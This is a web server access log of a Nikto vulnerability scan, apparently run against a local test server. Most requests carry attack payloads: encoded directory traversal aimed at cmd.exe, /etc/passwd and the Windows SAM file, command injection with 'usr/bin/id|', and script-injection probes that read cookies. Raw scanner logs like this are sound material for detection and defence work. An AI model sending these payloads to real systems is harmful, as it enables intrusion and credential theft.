172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /certsrv/..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003294)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003295)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003296)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003297)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pbserver/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003298)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rpc/..%255c..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003299)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003300)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003301)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003302)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /server-info HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003303)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /oekaki/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003305)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.nsconfig HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003306)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /?D=A HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003308)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /?N=D HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003309)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /?S=A HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003310)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /?M=A HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003311)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1 HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003312)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1 HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003313)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /dc/auth_data/auth_user_file.txt HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003314)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /dc/orders/orders.txt HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003315)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /dcshop/auth_data/auth_user_file.txt HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003316)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /dcshop/orders/orders.txt HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003317)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.FBCIndex HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003320)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /VdwQq9fweWG3ZQFNXQdhlyF8WHybjSmsY8GIkipciD5jSAOg4J8KFDO5X7GzILwef2vgWF3dLYbKk9ZmWybOw924xmXpxmTtZODwVQcBhK3FviGO8v9OuBp8b4JKErf4OrXdooAlOoFSidg8EchGPJG3GOzxzbcDY0TRFoxt2e0un373lUxFspjzofCtMrU1Al3n1BQojvdA98t8qLgZjiXOl59tO9Q<font%20size=50><script>alert(11)</script><!--//-- HTTP/1.1" 404 783 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003323)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003326)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003327)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003328)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /applist.asp HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003329)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /launch.asp?NFuse_Application=LookOut&NFuse_MIMEExtension=.ica HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003330)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_layouts/alllibs.htm HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003331)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_layouts/settings.htm HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003332)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_layouts/userinfo.htm HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003333)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.DS_Store HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003335)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /stronghold-info HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003342)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /stronghold-status HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003343)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /blah-whatever.jsp HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003344)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /gallery/index.php?include=../../../../../../../../../etc/passwd HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003345)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../../../../etc/passwd HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003346)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /phprocketaddin/?page=../../../../../../../../../../etc/passwd HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003350)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/exair/howitworks/Code.asp HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003352)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/exair/howitworks/Codebrw1.asp HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003353)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /msadc/Samples/selector/showcode.asp?source=/msadc/Samples/../../../../../../../../../winnt/win.ini HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003354)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/dadname/htp.print?cbuf=<script>alert('Vulnerable')</script> HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003355)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/help/<script>alert('Vulnerable')</script> HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003356)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /demo/ojspext/events/globals.jsa HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003357)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /globals.jsa HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003358)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/sample/admin_/help/..%255cplsql.conf HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003359)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003360)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%252f..%252f..%252f..%252f..%252f../windows/repair/sam HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003361)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003362)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam._ HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003363)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%255c..%255c..%255c..%255c..%255c../windows/repair/sam HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003364)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003365)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam._ HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003366)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%2F..%2F..%2F..%2F..%2F../windows/repair/sam HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003367)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003368)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._ HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003369)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003370)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ans/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003371)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /?\\\"><script>alert('Vulnerable');</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003373)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /h2PJIgPtLoabcd.html HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003374)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/exair/howitworks/codebrws.asp HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003375)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003376)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/com.newatlanta.servletexec.JSP10Servlet/ HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003377)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/CodeBrws.asp?Source=/IISSAMPLES/%c0%ae%c0%ae/%c0%ae%c0%ae/bogus_directory/nonexistent.asp HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003378)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/codebrws.asp HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003379)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/CodeBrws.asp?Source=/IISSAMPLES/%c0%ae%c0%ae/default.asp HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003380)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003381)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003382)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/exair/search/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003383)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/exair/search/search.idq?CiTemplate=../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003384)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pass_done.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003385)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/admin.php?adminpy=1 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003386)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iishelp/iis/htm/tutorial/redirect.asp HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003387)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlet/SnoopServlet HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003388)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Citrix/PNAgent/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003389)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Citrix/ICAWEB/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003390)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /IBMWebAS/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003391)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /IBMWebAS/docs/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003392)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /IBMWebAS/apidocs/ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003393)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /IBMWebAS/configDocs/ HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003394)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /IBMWebAS/mbeanDocs/ HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003395)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iishelp/iis/misc/default.asp HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003396)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Citrix/MetaFrameXP/default/login.asp HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003397)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /manager/html-manager-howto.html HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003398)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /manager/manager-howto.html HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003399)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /includes/adovbs.inc HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003400)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /adovbs.inc HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003401)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /fcgi-bin/echo HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003402)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /fcgi-bin/echo2 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003403)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/ldc/admin_/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003404)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /demo/basic/simple/viewsrc/welcomeuser.jsp.txt HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003405)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /README HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003406)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /demo/xml/xmlquery/viewsrc/XMLQuery.jsp.txt HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003407)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /soapdocs/webapps/soap/ HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003408)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003409)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shopadmin.asp?Password=abc&UserName=\\\"><script>alert(foo)</script> HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003410)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003411)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /phpinfo.php?cx[]=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